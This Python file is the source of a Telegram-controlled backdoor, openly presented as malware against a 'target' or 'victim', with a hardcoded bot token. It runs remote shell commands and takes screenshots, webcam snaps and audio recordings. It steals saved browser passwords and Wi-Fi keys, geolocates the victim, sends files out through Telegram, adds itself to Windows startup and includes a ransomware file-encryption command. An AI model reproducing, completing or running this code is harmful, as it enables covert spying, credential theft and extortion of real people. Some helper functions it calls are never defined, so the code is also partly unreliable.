import socket
import platform
import sys
import subprocess
import encryptdecrypt
import time
from func_timeout import func_timeout, FunctionTimedOut
import ALLPASS
import pyautogui
from sounddevice import rec, wait
import pygame.camera
import pygame.image
import ransomware
from wavio import write
import getpass
import json
import re
import os
import logging
import asyncio
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters


def add_to_startup(file_path=""):
    USER_NAME = getpass.getuser()
    if file_path == "":
        execute = subprocess.Popen('cd', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdout=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read()
        file_path = result.decode().strip()+r'\viv.exe'
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)


# Create a bot using the token provided by the BotFather


#
# bot = telepot.aio.Bot(token='5667592239')
# bot.sendMessage(814954319, 'target online')

# Define a function to handle incoming messages


# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)

logger = logging.getLogger(__name__)

# Create a bot using the token provided by the BotFather
updater = Updater(token='5667592239:AAGvc4ye4A_lXhjonFVFrnF8GgV7qO3ooGw', use_context=True)
# def send(result):
#     # Send a message
#     context.bot.send_message(chat_id=chat_id, text=result)
# def upload(file):
#     context.bot.send_document(chat_id=chat_id, document=open(file, 'rb'))


# Define a function to handle incoming messages
def handle_message(update, context):
    # Extract the chat ID and message text from the message
    chat_id = update.effective_chat.id
    command = update.message.text

    def send(result):
        # Send a message
        context.bot.send_message(chat_id=chat_id, text=result)

    def upload(file):
        context.bot.send_document(chat_id=chat_id, document=open(file, 'rb'))

    if command == '/kill_malware':
        sys.exit(1)
    elif command[:4] == 'cd ':  # to change the working directory
        os.chdir(command[3:])  # changing working directory with os module

    elif command == '/help':
        hostname = platform.uname()[1]

        send('[+] Target connected as ' + hostname)


        send('''            Cross platform supported on all os including mac, windows and linux
                                             COMMANDS                   DESCRIPTION
                                                /kill_malware          ->  exit from shell and terminate backdoor on target
                                                /execute  shellcommand -> windows, linux,macos commands(like cd, del ,echo,dir ,touch and so on)
                                                /screenshot            ->  takes screenshot of target
                                                /download <filename>   ->  recieve file from victim
                                                /upload <filename>     ->  send file to victim
                                                /cd                    ->  change directory
                                                /snap                  ->take camera snap of target
                                                /record_10             ->reocrd audio for 10 sec.To record for  more time replace 10 with any number of seconds
                                                *************************************************************************************************
                                                Advance Feature: supported only for windows os [support developer bibek to get cross platform advanced feature] ]
                                                *************************************************************************************************
                                                /firefox_password      ->extract all firefox saved password on target (No pin required)
                                                /chrome_password       ->extract all chrome saved password on target(No pin required)
                                                /brave_password        ->extract all brave password on target (No pin required)
                                                /opera_password        ->extract all opera password on target (No pin required)
                                                /vivaldi_password        ->extract all vivaldi password on target (No pin required)
                                                /edge_password        ->extract all edge password on target (No pin required)
                                                /wifi_password         -> extract all wifi password saved on windows
                                                /firefox_history       ->extract all firefox history of   target(no pin required)
                                                /geolocate             -> extract precise location with in 10 m radius depends on victim device gps ability
                                                /persistence           -> provide priveleged to your backdoor to automatically starts during system startup ''')

    elif command == "/firefox_history":
        try:
            ALLPASS.main2()


        except:
            send('firefox may not be installed on system')
            pass
    elif command == '/wifi_password':
        try:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
            for i in profiles:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
                    'utf-8').split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                try:
                    with open('wifi.txt', 'a') as w:
                        w.write("{:<30}|  {:<}".format(i, results[0]) + '\n')
                except IndexError:
                    with open('wifi.txt', 'a') as w:
                        w.write("{:<30}|  {:<}".format(i, "") + '\n')
        except:
            send('[-]operation failed')

    elif command == '/geolocate':
        try:
            accuracy = 3
            pshellcomm = ['powershell']
            pshellcomm.append('add-type -assemblyname system.device; ' \
                              '$loc = new-object system.device.location.geocoordinatewatcher;' \
                              '$loc.start(); ' \
                              'while(($loc.status -ne "Ready") -and ($loc.permission -ne "Denied")) ' \
                              '{start-sleep -milliseconds 100}; ' \
                              '$acc = %d; ' \
                              'while($loc.position.location.horizontalaccuracy -gt $acc) ' \
                              '{start-sleep -milliseconds 100; $acc = [math]::Round($acc*1.5)}; ' \
                              '$loc.position.location.latitude; ' \
                              '$loc.position.location.longitude; ' \
                              '$loc.position.location.horizontalaccuracy; ' \
                              '$loc.stop()' % (accuracy))

            # Remove >>> $acc = [math]::Round($acc*1.5) <<< to remove accuracy builder
            # Once removed, try setting accuracy = 10, 20, 50, 100, 1000 to see if that affects the results
            # Note: This code will hang if your desired accuracy is too fine for your device
            # Note: This code will hang if you interact with the Command Prompt AT ALL
            # Try pressing ESC or CTRL-C once if you interacted with the CMD,
            # this might allow the process to continue

            p = subprocess.Popen(pshellcomm, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                 text=True)
            (out, err) = p.communicate()
            out = re.split('\n', out)

            lat = float(out[0])
            long = float(out[1])
            context.bot.send_message(chat_id=chat_id, text=f'[latitude,longitude]={[lat, long]}')
        except:
            send('[-]operation failed')

    elif command == '/screenshot':
        try:
            image = pyautogui.screenshot()
            image.save('ss.png')
        except:
            pass
    elif command == '/snap':
        def snap():
            try:
                # Initialize Pygame and the camera
                pygame.init()
                pygame.camera.init()

                # Set the display mode
                screen = pygame.display.set_mode((640, 480))

                # Get a list of available cameras
                camera_list = pygame.camera.list_cameras()

                # Check if any cameras are available
                if len(camera_list) > 0:
                    # Use the first camera in the list
                    camera = pygame.camera.Camera(camera_list[0], (640, 480))
                    camera.start()

                    # Get the image from the camera
                    image = camera.get_image()

                    # Display the image on the screen
                    screen.blit(image, (0, 0))
                    pygame.display.update()

                    # Save the image to a file
                    pygame.image.save(image, "snap.png")

                    # Stop the camera
                    camera.stop()
                else:
                    print("No cameras found")
            except:
                pass

        snap()


    elif command[:9] == '/download':
        try:
            upload(command[10:])
        except:
            send('no file found on that folder .check the file name and try again')
            pass
    elif command[:8] == '/record_':
        try:
            # Sampling frequency
            freq = 52000

            # Recording duration

            duration = int(command[8:])

            # Start recorder with the given values
            # of duration and sample frequency
            recording = rec(int(duration * freq),
                            samplerate=freq, channels=2)

            # Record audio for the given number of seconds
            wait(5)
            # Convert the NumPy array to audio file
            write("recording.wav", recording, freq, sampwidth=2)
        except:
            send('[-]operation failed')
    elif command == '/persistence':
        try:
            add_to_startup()
            send('sucessfully added to startup')
        except:
            send('[-]operation failed or blocked by antivirus')





    # elif command[:6] == 'upload':
    #     try:
    #         download_file(command[7:])
    #     except:
    #         pass

    elif command[:17] == '/firefox_password':
        with open('pass.txt', 'a') as f:
            f.write('\n' + f'''if there is no password, the firefox may not be installed or profile is empty''')
        try:
            if command[17:]:
                ALLPASS.main(command[17:])
            else:
                ALLPASS.main('2')
        except:
            pass


    elif command == '/chrome_password':
        with open('pass.txt', 'a') as f:
            f.write('\n' + '''if there is no password, the chrome may not be installed or profile is empty''')
        local_state_path = os.path.normpath(
            r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
        path = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))
        try:
            ALLPASS.Chromium.main(path, local_state_path)
        except:
            send('chrome may not be installed on target')

    elif command == '/brave_password':
        with open('pass.txt', 'a') as f:
            f.write('\n' + ''''if there is no password, the Brave may not be installed or profile is empty''')
        local_state_path = os.path.normpath(
            r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State" % (os.environ['USERPROFILE']))
        path = os.path.normpath(r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data" % (os.environ['USERPROFILE']))
        try:
            ALLPASS.Chromium.main(path, local_state_path)
        except:
            send('brave may not be installed on target')
    elif command == '/edge_password':
        with open('pass.txt', 'a') as f:
            f.write('\n' + '''if there is no password, the edge may not be installed or profile is empty''')
        local_state_path = os.path.normpath(
            r"%s\AppData\Local\Microsoft\Edge\User Data\Local State" % (os.environ['USERPROFILE']))
        path = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data" % (os.environ['USERPROFILE']))
        try:
            ALLPASS.Chromium.main(path, local_state_path)
        except:
            send('Edge may not be installed on target')
    elif command == '/vivaldi_password':
        with open('pass.txt', 'a') as f:
            f.write('\n' + '''if there is no password, vivaldi may not be installed or profile is empty''')
        local_state_path = os.path.normpath(
            r"%s\AppData\Local\Vivaldi\User Data\Local State" % (os.environ['USERPROFILE']))
        path = os.path.normpath(r"%s\AppData\Local\Vivaldi\User Data" % (os.environ['USERPROFILE']))
        try:
            ALLPASS.Chromium.main(path, local_state_path)
        except:
            send('Vivaldi may not be installed on target')
    elif command == '/opera_password':
        with open('pass.txt', 'a') as f:
            f.write('\n' + '''if there is no password, the opera may not be installed or profile is empty''')
        local_state_path = os.path.normpath(
            r"%s\AppData\Roaming\Opera Software\Opera Stable\Local State" % (os.environ['USERPROFILE']))
        path = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable" % (os.environ['USERPROFILE']))
        try:
            ALLPASS.Chromium.main(path, local_state_path)
        except:
            send('opera may not be installed on target')
    elif command == '/ransomware':
        send(
            '''please enter file name to perform ransomware.if you to encrypt all file in current directory then enter all''')
        file_name = receive()
        send("please enter key to encrypt.for  example: b'542ZkZPChbIxUSq53Mcjt4OduQGZSWCCYhFQ_TY7-AA='")
        time.sleep(1)
        download_file('key.key')

        send('encryption started. have patience')
        start = ransomware.encryption(file_name)
        send(start + 'delete key file using command: del /f key.key')
        pass

    elif command == '/reverse':
        send(
            '''please enter file name to perform ransomware.if you to decrypt all file in current directory then enter file_name= all''')
        file_name = receive()
        send(
            "please enter key to decrypt.for  example: key=b'542ZkZPChbIxUSq53Mcjt4OduQGZSWCCYhFQ_TY7-AA='  .Note key start with b and ends with quatation comma. ")

        time.sleep(1)
        download_file('key.key')
        send('[+]decryption started. have patience wait for 30 sec')
        start = ransomware.decryption(file_name)
        send(start + 'delete key file in target using command: del /f key.key')

    else:

        def execute_shell():

            execute = subprocess.Popen(command[1:], shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdout=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            return (result)

        try:

            send(func_timeout(5, execute_shell))

        except FunctionTimedOut:
            send('target stucked try again')
        except:
            send('[-]operation failed')

# Set the bot to listen for incoming messages
dispatcher = updater.dispatcher
message_handler = MessageHandler(Filters.text, handle_message)
dispatcher.add_handler(message_handler)


# Start the bot
updater.start_polling()